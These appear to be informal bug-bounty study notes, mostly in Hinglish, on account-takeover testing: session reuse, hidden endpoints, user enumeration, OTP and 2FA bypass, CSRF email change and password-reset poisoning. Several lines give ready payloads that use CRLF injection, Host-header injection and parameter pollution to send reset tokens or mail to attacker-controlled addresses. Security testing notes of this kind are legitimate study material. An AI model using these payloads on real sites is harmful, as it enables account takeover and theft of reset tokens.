

https://t.co/cxKu4z9uZY?amp=1

https://www.youtube.com/watch?v=D7yaMD-zvW0&t=530s     cabalt video 


------------- tip ------------------  login form me bugs dundhte time 

One thing that I do most often when I start with my testing is when I enter the credentials and 
click login I turn on my burp proxy and when the login functionality 
is completed and the landing page is completely loaded in the browser. 
I turn off my proxy for a while and take a look at my Burp History.
This methodology of mine gives me a good understanding of what requests the application sends and response is received on login(just login).




------------------- end -------------------------  




1 st  method 

------------------------- session highjacking and session management -------------------------------- 

log in to acc go to the cookie editor copy the cookies and save to the clipboard 

now logout and use this cookie in cookie editor extension is web app is vulneabale is log in to your acc 


session Doesnt expire on password reset change

---------------- end --------------------------

-------------------  2nd methods -----------------------------

Authenticatio bypass by using js file 

Js file me se hidden endpoint nikalo or acces karkne ka try karo force browsing method bolte he isse 
acces control issue 

------------ Username and Email Address Enumeration -----------------  

1 reset and login page pe jake galat password dalo or response check karo 

register page pe jake existing user dalke dekho respone me ky milta he  	


------------------- reset password pe link me token atta he usko hatake dekho ------------ 



------------- reset password link pe host header hoga token churaya ja sakta he -------- 

alag alag headers dalke burp-collabrator ka link dalo http me token ayega 

email="victim@mail.tld%0a%0dcc:attacker@mail.tld"

im JSON array: {"email":["victim@mail.tld","atracker@mail.tld"]}

with CLRF: /resetPassword?0a%0dHost:atracker.tld (x-host, true-client-ip, x-forwarded...)	

email=victim@email.com&email=attacker@email.com
email=victim@email.com%20email=attacker@email.com              paylaods 
email=victim@email.com|email=attacker@email.com
email="victim@mail.tld",email="attacker@mail.tld"

email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"


---------------------------- otp bypass techniquies by rohit huatam sir ------------------- 
1]
put the incoorect otp and see the response 
by response manipulation replace the right response with wrong response 

---------------------------------------

2] 

put right otp and see the response if server return the userid something username 

change it with vitim details and send the response to the server 


-------------- ------------------------ 

3] otp pahale hi response me atta he  

---------------------------------- 

4] 2fa auth ka enabale karne wala requests capture karo fir logout karo 

fir vo request me jake disable karo and repeat karo request ko sfa disable ho jayega 



------------------------------------------------- 
5]  email takeover 

contact  form me 2 email dalne ka jagah tha pahale email ko activate kiya 

2 sr register kiya or firse pahale email me jake  firse link pe click kiya 


------------------------------------ case study ------------- 

ek site pe email and Oauth dono he 
attacker ne email se signup kiya and victim ne Oauth se login kiya to 
email confirmation apne app pass ho jata he Oauth ke bajjse 
pre account takeover bolte he 

---------------------------------------------------------------------- 

--------------------- token issues ---------------- 
search token value in search parameter check if it reflected in any request or response  

use attacker acc token if it valid boom 

------------------------- end ---------------------------


 
--------------- case study ---------------------------------- 

after signup go to the email and check link what they want 

ek case study me sirf email and username chiye tha bande ne link copy karke browser me khola 
email verify ho gaya 

--------------------------------------------------------------- 

-------------------------- crlf in password reset posioning -------------------- 

email='victim@gmail.com%d%acc:attacker@gmail.com'      mail attacker ko bhi jayega

GET /resetpassword?%d%aHost:attacker.com       token leak hoga 



---------------------- end ---------------------------------------


----------------  account takeover through CSRF -------------- 

email change function -- post request -- csrf token

chaneg the req to the get request and forward the request 

GET /change_email?paramaeter=value
 

--------------------------- end --------------------------------

-------------- target has change password function --------- 

problem -  it require the current password 

remove the field  and forward the request 


----------- end ------------------------------












